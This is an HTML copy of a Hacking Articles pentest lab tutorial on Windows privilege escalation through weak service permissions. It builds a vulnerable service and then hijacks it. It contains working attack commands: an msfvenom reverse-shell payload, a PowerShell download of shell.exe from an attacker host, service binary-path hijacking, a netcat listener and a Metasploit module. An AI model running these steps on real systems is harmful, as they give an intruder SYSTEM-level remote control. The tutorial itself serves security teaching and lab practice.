@@ -1,0 +1,114 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: Weak Services Permission</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/" rel="bookmark"><time class="entry-date published" datetime="2021-10-11T20:47:14+00:00">October 11, 2021</time><time class="updated" datetime="2025-05-10T20:29:08+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Windows Privilege Escalation: Weak Services Permission is a critical topic in cybersecurity, especially when dealing with Microsoft Windows environments. Microsoft Windows offers a wide range of fine-grained permissions and privileges for controlling access to Windows components, including services, files, and registry entries. Exploiting misconfigured services is one technique attackers use to increase privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgzbTVxbw6fVGiE-qckn5BqcGwrrFofra6Cn4eK8eBl3N0pfKUARfqilAcuVxsOXztIJ6LESR42DAvJ9W00CkeDiQX8VZ_BJFCC6fhnh7aJVXDm8r5CQ-tpDTIY7087k7bE2pQdMmw3pfr3TmzcowwTc9GYN34fYKQzU9R54bEDMch57LbJICwFbwYl6g=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">MS Windows Services</span></li>
+<li><span style="color: #000000;">Access Rights for the Service Control Manager</span></li>
+<li><span style="color: #000000;">Weak Service Permission Lab Setup</span></li>
+<li><span style="color: #000000;">Abusing Insecure Configuration File Permissions (PTOC)</span></li>
+<li><span style="color: #000000;">Abusing Insecure Service Executable (PTO)</span></li>
+<li><span style="color: #000000;">Metasploit</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>MS Windows Services</strong></span></h3>
+<p><span style="color: #000000;"><strong><a style="color: #000000;" href="https://docs.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications">Microsoft Windows services</a></strong>, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface. For each service, a registry key exists in HKLM\SYSTEM\CurrentControlSet\Services.</span></p>
+<p><span style="color: #000000;">A system or a user account must be linked to a service for it to function properly. The following built-in system accounts are frequently used to operate services:</span></p>
+<ul>
+<li><span style="color: #000000;">LocalService</span></li>
+<li><span style="color: #000000;">NetworkService</span></li>
+<li><span style="color: #000000;">LocalSystem</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Access Rights for the Service Control Manager</strong></span></h3>
+<p><span style="color: #000000;">The SCM creates a service object’s security descriptor when the service is installed by the <strong>CreateService</strong> function. The default security descriptor of a service object grants the following access.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFttE9jcG1VLvRQuWtXFHO8RL9xTYivhYuE6bK8vLYzgptiVVAjbErTuAH1UVSbEytqIdzO4jBYaMm1nCXYLcyn5tMpTmr9Dt2xvxGnlIFkz-clpRAZTQDjl-SFr_oT32SAXDdIoB5g-Xu5nXGuZtdIOnaS0GHL4Vz2zApjDyWBndYgKW9BEwWg5aCjQ=s16000"/> </strong></span></p>
+<h3><span style="color: #800000;"><strong>Weak Service Permission Lab Setup</strong></span></h3>
+<p><span style="color: #000000;">This article will help to set up a lab that focuses on two Windows weak service Permission misconfigurations that allow an attacker to get administrative privileges:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Insecure Configuration File Permissions:</strong> A low-privileged user can update service settings, such as the service binary that runs when the service starts.</span></li>
+<li><span style="color: #000000;"><strong>Insecure Service Executable</strong>: When the service starts, a low-privileged user can overwrite the binary it launches.</span></li>
+</ul>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEihG119NMt2V_4LlTrrko1T_sDJ99KofiWpUtvtkqS1-AV8G2LwGVA8fsLamvktbCNT70fUT-aeb0zniOMrVfmGuN6gCQ6Yv0I7dt9EBZ1LG7B-eRQcV1eWDz-k9-WWT1fOctr9QvhdHskgGS09jVsXrwmryEw8K8eNG5KJyEPVQXKKxnyE79WInyWGgg=s16000"/></p>
+<p><span style="color: #000000;">An Access Control List (ACL) for each service defines the permissions for that service. Some permissions are extremely damaging, such as:</span></p>
+<ul>
+<li><span style="color: #000000;">Command: sc qc &lt;service&gt; – to query the configuration of the service</span></li>
+<li><span style="color: #000000;">Command: sc query &lt;service&gt; – to check the current status of the service</span></li>
+<li><span style="color: #000000;">Command: net start/stop &lt;service&gt; – to start and stop the service</span></li>
+<li><span style="color: #000000;">Command: sc config &lt;service&gt; &lt;option&gt;= &lt;value&gt; – change the configuration of the service</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Steps for Weak Services Permissions </strong></span></p>
+<p><span style="color: #000000;"><strong>Step 1:</strong> Run CMD as administrator and execute the below command to create a service with the name of Pentest inside /temp directory</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc.exe create pentest binPath= "C:\temp\service.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhDcyjqw2Ic26lFbpwaXEUrjhnQcSDg99jn6ERrWAK6mUwpw-YLGTIK5PiJOGiELjCYjelKE-0DL6ZMt869by9BLNrdGuF1JPjo8zhbQmgR5QTvP5Oql6QHDbpgmYEMjkP7yytY6ZgvGiAdBaK7Vnwg42nLTWQpMRTMfMjDJz852LxtIRObtc_Rdxco_w=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step2:</strong> To create a vulnerable service we need to assign some toxic privilege with the help of <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Ignitetechnologies/OSCP_Tools/blob/main/subinacl.msi">SubinACL</a> </strong></span>to change the permission of services.</span></p>
+<p><span style="color: #000000;"><strong>NOTE</strong>:</span></p>
+<p><span style="color: #000000;"><em>SubInACL is a little-known command-line tool from Microsoft, yet it is one of the best tools to work with security permissions in Windows. This tool is capable of changing the permissions of files, folders, registry keys, services, printers, cluster shares and various other types of objects.</em></span></p>
+<p><span style="color: #000000;"><em>In this case, we have granted a user permissions to suspend (pause/continue), start and stop (restart) a service. The full list of the available service permissions:</em></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg0FCXuEdfOeMYWG8uIDG-c3WJ5D49Ooi2-9ccJSqDlfoV-OAM-Rpy_pFqw-f_-hhtI-WpdVRLfO83WprS9-DyNuYDqD3C38lyzljrNHwqbkv-9XK652LWKCgfVE0WQNbz35Q899VXI0zvPb9dh6HqFnsXNVVn4Bgn_sS5qHZmLvEC8oGm8XefAnq1JxA=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step3:</strong> After Download SubinACL, execute the following command to assign <strong>PTOC Permissions </strong>user “ignite” against “Pentest” service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Program Files (x86)\Windows Resource Kits\Tools
+subinacl.exe /service pentest /grant=msedgewin10\ignite=PTOC</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEilLRXvlsa5GCnQUpWgcJIh7MVef0sT1leJdzh6C26dismfy9jtTUbfnRFiKyj0tOWXoAFoby-vFJPSGXJZ0LmFgs0rchrVJvmWn_JuZ9cZ1YgoAMMgs1oja_tk1zE4gs4Yid6nAjU3kjZwUHZ9AWdHQ3ZfcWy3L0uACdd3TwFGlXoQkzMUnFF3Ta4JJw=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Abusing Insecure Configuration File Permissions (PTOC)</strong></span></h3>
+<p><span style="color: #000000;">An attacker can escalate privileges by exploiting Service Configuration if the system binaries have the SERVIC_ ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions.</span></p>
+<p><span style="color: #000000;">Following an initial foothold, you may use the wmic programme to enumerate system services and query for the service name, startname, and path.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic service get name,startname,pathname</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEilCW5T_7iB0sNBiRu5S0xs_RypzxvFEuj1x5acNRzSNTICuWJg2LSsXda35-RmRAinoJCPQOTtinScpyPFzmb1UMmiIAoqr9uqSy2nPTzAu4lpZwYf0T8YN_zMmZGdq7sOWrlPtj9Xb_n8wbpOHFTA-gc9gtD9BFwQ_HJ-pi6CzN6GyW4dFt53QDf3Bw=s16000"/></span></p>
+<p><span style="color: #000000;">The service name shown as pentest exits the c:/temp directory, as shown in the following image. We may verify the service configuration with the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc qc pentest</pre>
+<p><span style="color: #000000;">The service account type is Localsystem, and it has privileges to start, stop, and pause services, according to the output.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjdOaEupcMw9xJ38PXHnW7D4lLv1YGOimMBMyM7tzKn0Cp9UI3U50mGitqyzezu4Xi0gSYUvpByfqoRma4dk95tzqPcSERVzSWCTaa5ZKaDCNFDi1EgIkH2Y0wwbmModEu9ohxeu8M0hb3BtEKcdwg7XpV5Kmb74IzOFr3hgIx-Vsd7AJBEQPX_zjyPDw=s16000"/></span></p>
+<p><span style="color: #000000;">We can identify SERVICE ALL ACCESS or SERVICE CHANGE CONFIG permissions using the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk</a> </strong></span>Sysinternals tool since these capabilities allow attackers to change service settings.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">accesschk.exe /accepteula –uwcqv ignite pentest</pre>
+<p><span style="color: #000000;">It says that Ignite user has full access to this service</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhKJ0aJnTZ0qkuzps8VVAhwbMHDnudJGp9GQ4udMMnAS2c5Zcdl8Vh9SBx4d1nFtFmJLl3BRGRz9XPdPwID1eWK2P7iS3Bl1S5VrsUHmerbjk3vICyZ09NTfhzlF1QGlCy6E6GWshj3C86UGqqwTHMAXOFHBOuerFDCUZX1HLuICW8rpnzsXe6So_vjBg=s16000"/></span></p>
+<p><span style="color: #000000;">Create an executable shell and install it on the victim’s machine, then modify the service binary path to a malicious executable since the user ignite has full access to the service and therefore has the ability to change the configuration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt;  shell.exe
+python –m SimpleHTTPserver 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj_ulZurc8ZHlvA8etYPuCQARshCPV1K1viiid4TjV9LNh3rN9xsLis3fXCztGPLPogVnt-GUgApDtKjue50OOwg--IzUj_DGpH7bdMTn5bU1RcJLmE48sl5OOF6upfDBY4_huvsDnfENwSc-CLeOPojkGdZnCykziTK1S2duvLmty-SIr5ly6AKdjEjg=s16000"/></span></p>
+<p><span style="color: #000000;">Use the following command to transfer malicious shell.exe into C:/temp and start a new Netcat listener within Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\Users\public
+powershell wget http://192.168.1.3/shell.exe -o shell.exe
+dir</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg81MEbK21ugqTpYvWVTobTPxJWzEbQlRw1ma3c21FU1IqWCIGjR2kNK73QIe0LIekpTho3S5bjPSpnAbwARzRvv2P0zyLXWnVeikmkYfPq3JRHe3UvDU-_aUPC1xQTHEmp9Z5j5eI0RJqkN3HQMgcfWbPGHFEkyzKxkbNvNC473t1BQCNoUuH-th_d5w=s16000"/></span></p>
+<p><span style="color: #000000;">Because the ignite user has access to edit the service configuration and subsequently start the service, thus we can change the path and point it to our reverse shell payload.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc config pentest binPath= "C:\Users\Public\shell.exe"
+net start pentest</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjsp1O4U6pZqGDQYa28u6s6leNOTXd3V-iHqqW7s7hIg7B5KTCfPMvk9GcIdSIqOnphUe-glHHMEogkrxEeT4IX78QpuV3o6E2UKX0jzFyIHBys5B-a3wia4nC3cVqffb0Z6H4XvMlNYl4QPOKZS1waQ5cyFZsThMqkzJvg-BWSKER1NAXqvCYdIf6qEA=s16000"/></span></p>
+<p><span style="color: #000000;">As soon as the service will launch, the attacker will get a reverse connection in the new netcat session as NT Authority \system</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 8888
+whoami</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjKbhFUorFwFxwp7K1_NkhDfKIYwkzEw-D919JDh84YnzDKx7XZZsZbpFE6Iten2uUzcpTj2X0Q8TIACuvdN6R4Wgh6PqvD9yDuaC8Z6-a0sScjYBX3qi_nU20R1m8ZKO3GNi8lq5AXF4A8DGC8TSs3_RlRjUaeXfFLyTAC-1J2SukK2zklttKKUdBSyg=s16000"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Abusing Insecure Service Executable (PTO)</strong></span></h3>
+<p><span style="color: #000000;">If the low-privilege user has at least Pause/continue, Start, and Stop permissions for the service, an attacker may attempt to overwrite the system binaries with a malicious executable file in order to escalate privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\temp
+dir
+move service.exe service.bak</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgj_qJBPmq97_qLikuO4v5ZQf4XAZHSCj-_EBOAl4bl0Th9PHCAIJr8Gb_vLXI94HOh7oGqWk9rvYlm7W5aWab_LWGTX0cxeKtlcf4hFpNILGFPeieNBzWz6WMrLD6MOSyVW4VhYKkGt_R_VUCC-Da4h9Aq6GgE0nPxS-3CaSO-GJpND72kjrF3kQGJEQ=s16000"/></span></p>
+<p><span style="color: #000000;">Use the following command to transfer malicious shell.exe into C:/temp and start a new Netcat listener within Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget http://192.168.1.3/shell.exe -o service.exe</pre>
+<p><span style="color: #000000;">As soon as the service will launch, the attacker will get a reverse connection in the new netcat session as NT Authority \system</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi2B9iJRWOx7IZLrLpxicFPNLpS2x9LRcE6riA3WJk5SOcWLNIPLotgcBmv5oaCTyAiyAmRRtlb5mv_2ljOrUKNfJNOcCNtnxXQu6TmzVRV9HsXOauNNkO0oVjpCuOEi8ORJcvTFiBdZXCdq6hyTrLw0hKnahYIuARG2BWHUhbG8KrA6Kh_5eGSoE8myA=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 8888
+whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhIYxv923ZXY4Nod5eCW55LOpmIDjwbuSZjzQGSgr4P7uULI2WkDg2zeJMELH6lFRBzrd7l8kQNmyj4viL4zOGwncR6GWKUMykEUpss-ylNgV5r59jlM5EjwLQrmQLlMOWwURFWh7Cutm7gfXkh-cL8ikD7cSPpujyMIb2Q6WLB1g3Q0n5Dkk499mdowQ=s16000"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Metasploit</span> </strong></span></h3>
+<p><span style="color: #000000;">This module attempts to exploit existing administrative privileges to obtain a SYSTEM session. If directly creating a service fails, this module will inspect existing services to look for insecure configuration, file or registry permissions that may be hijacked. It will then attempt to restart the replaced service to run the payload.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/service_permissions
+set lhost 192.168.1.3
+set session 1
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhqPQQhL-zdE1w9Mp1k4vwTFcETAGXtaXWQ1ZiIq1CvE8Ofu1EVxgJZ6d9zUAjvBVub1-Dk0uVL_NPB_ZmEwzI2yw63eQaSTQEl_xdPvoTJW8AoAuvQqRPyIdRjFZk93AJoHvJFqlT-0ASRxX_EgKDyGeupBmDfQjuFCbTJY5FK6qhultimkptDCS5CjA=s16000"/></span></p>
+<p><span style="color: #000000;">This will result in a new session as NT AUTHORITY\SYSTEM when this succeeds.</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications">https://docs.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications</a></strong></span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
